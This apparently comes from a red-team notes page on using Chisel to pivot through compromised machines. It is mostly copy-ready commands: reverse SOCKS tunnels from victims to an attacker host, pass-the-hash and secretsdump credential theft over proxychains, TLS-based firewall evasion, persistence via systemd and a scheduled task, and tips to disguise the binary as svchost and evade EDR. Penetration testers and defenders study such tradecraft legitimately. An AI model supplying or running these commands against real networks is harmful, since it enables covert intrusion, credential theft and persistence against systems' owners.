---
title: Chisel
---

Chisel is a single Go binary that gives you a SOCKS proxy over HTTP(S). It works when SSH doesn't (Windows pivot without SSH server, egress restricted to HTTP ports, or a web-app shell that can only initiate outbound HTTP). Server + client are the same binary with different flags.

## Why Chisel Over SSH

- Pivot is Windows and you don't want to deal with OpenSSH service
- Pivot egress is restricted to 80/443
- You want something that looks like HTTPS on the wire
- You need a quick tunnel without installing anything server-side

Download from [github.com/jpillora/chisel](https://github.com/jpillora/chisel) releases — static binaries for every OS/arch.

## Setup

**Attacker (server):**
```bash
./chisel server --reverse -p 8000
# -p 8000: listening port
# --reverse: allow clients to request reverse port forwards (needed for SOCKS)
```

Optional:
- `-p 443 --tls-cert cert.pem --tls-key key.pem` for HTTPS mode
- `--auth user:pass` for shared-secret auth

**Victim (client, Linux):**
```bash
./chisel client <attacker-ip>:8000 R:1080:socks
# R: reverse
# 1080: port on attacker that becomes the SOCKS5 proxy
# socks: tunnel type
```

**Victim (client, Windows):**
```powershell
.\chisel.exe client <attacker-ip>:8000 R:1080:socks
```

Now on the attacker: `127.0.0.1:1080` is a SOCKS5 proxy routing through the pivot.

```ini
# /etc/proxychains.conf
[ProxyList]
socks5  127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn -n 10.10.11.0/24 -p 445,3389
proxychains evil-winrm -i 10.10.11.5 -u admin -H <NThash>
proxychains impacket-secretsdump admin:'Pass!'@10.10.11.5
```

## Specific Port Forwards (Not SOCKS)

If you only need one port exposed, skip SOCKS:

```bash
# Expose pivot's 10.10.11.5:3389 on attacker localhost:3389
./chisel client <attacker>:8000 R:3389:10.10.11.5:3389

# Then on attacker:
xfreerdp /v:localhost:3389
```

Multiple remote forwards in one client command:

```bash
./chisel client <attacker>:8000 R:3389:10.10.11.5:3389 R:445:10.10.11.5:445 R:1080:socks
```

## Non-Reverse Mode (Classic SSH `-L` equivalent)

Attacker runs server, forwards attacker's port through server to a remote target:

```bash
# Attacker
./chisel server -p 8000

# Victim/pivot
./chisel client <attacker>:8000 1080:socks
```

But this requires the pivot to accept inbound from attacker — unusual in a pivot scenario. Reverse mode (`R:`) is standard.

## HTTPS Mode (for Firewall Bypass / Blending)

```bash
# Attacker
./chisel server --reverse -p 443 --tls-cert /etc/letsencrypt/live/me.com/fullchain.pem \
  --tls-key /etc/letsencrypt/live/me.com/privkey.pem

# Victim
./chisel.exe client https://me.com:443 R:1080:socks
```

With a real cert on a real domain, this is indistinguishable from HTTPS web traffic.

### Authenticating Through Corporate Proxy

```bash
./chisel.exe client --proxy http://corp-proxy:8080 http://attacker:8000 R:1080:socks
# With NTLM auth:
./chisel.exe client --proxy http://user:pass@corp-proxy:8080 ...
```

## Chaining Multiple Pivots

### Scenario: two-hop pivot via Chisel

```
Me → Chisel1 (pivot A) → Chisel2 (pivot B, inside) → final target
```

Setup:
1. Attacker: `chisel server --reverse -p 8000`
2. Pivot A: `chisel client attacker:8000 R:1080:socks`
3. proxychains on attacker uses SOCKS 1080 → reaches pivot A's internal network
4. Pivot A: spin up another chisel server:
   ```bash
   ./chisel server -p 9000
   ```
5. Pivot B (reached via pivot A): `proxychains -q scp chisel.exe to pivot B` then run:
   ```bash
   ./chisel client pivotA:9000 R:1081:socks
   ```
6. Attacker's SOCKS endpoint (via pivot A) now has 1081 too — but reaching it requires the first tunnel

Proxychains supports chaining:
```ini
# Two-hop in strict_chain
[ProxyList]
socks5  127.0.0.1 1080    # Chisel back from pivot A
socks5  10.10.11.5 1081   # Chisel back from pivot B (reachable via pivot A)
```

## Running Chisel as a Service (Persistence)

Attacker:
```bash
# systemd unit
sudo tee /etc/systemd/system/chisel.service <<'EOF'
[Unit]
Description=Chisel reverse server
After=network.target

[Service]
ExecStart=/usr/local/bin/chisel server --reverse -p 8000
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable --now chisel
```

Pivot (Linux, persistent client):
```bash
nohup ./chisel client attacker:8000 R:1080:socks >/dev/null 2>&1 &
```

Pivot (Windows, persistent):
```powershell
# Scheduled task on login
schtasks /create /tn ChiselClient /tr "C:\tmp\chisel.exe client <attacker>:8000 R:1080:socks" /sc onlogon /rl highest /f
```

## Hiding Chisel

- Rename the binary (`chisel` → `svchost`, `updater`, something innocuous)
- Run from a non-obvious path (`C:\Windows\Tasks\`, `/tmp/.X11-cache/`)
- Add `--fingerprint` auth to resist opportunistic connection attempts
- Use port 443 with TLS to look like legitimate HTTPS

Red team note: chisel binary is well-known to EDR. Consider recompiling with modified strings or using an alternative like [rsocx](https://github.com/moontear/rsocx), [reGeorg](https://github.com/sensepost/reGeorg), or writing a quick-and-dirty SOCKS implementation in whatever language is already on the box.

## Debugging Chisel Connections

```bash
# Server verbose
./chisel server --reverse -p 8000 -v

# Client verbose
./chisel client -v attacker:8000 R:1080:socks
```

Common failures:
- **"unknown transport" / 404** — hitting the wrong port, or wrong protocol (http vs https prefix)
- **Connection drops after a few seconds** — proxy/firewall closing idle connections; add `--keepalive 25s`
- **Version mismatch** — "client/server version mismatch" error. Match versions exactly.
- **TLS cert verify fails** — add `--tls-skip-verify` on client (self-signed)

## Comparison vs Alternatives

| Tool | Transport | Strengths | Weaknesses |
|---|---|---|---|
| Chisel | HTTP(S) | Fast, single binary, TLS, reverse | Known signature |
| Ligolo-ng | TCP + TLS | Superior routing (no proxychains needed, TUN interface) | Newer, less docs |
| SSH `-D` | SSH | Standard, encrypted, well-known | Needs SSH server/client on pivot |
| reGeorg | HTTP via webshell | Works through webshell on compromised web server | Slow, legacy |
| rpivot | HTTP CONNECT | Works through corporate HTTP proxy | Python 2, old |

**For modern engagements:** Chisel or Ligolo-ng. Ligolo if you want TUN-interface pivoting (no proxychains needed); Chisel if you want simpler single-port HTTP(S) connectivity.
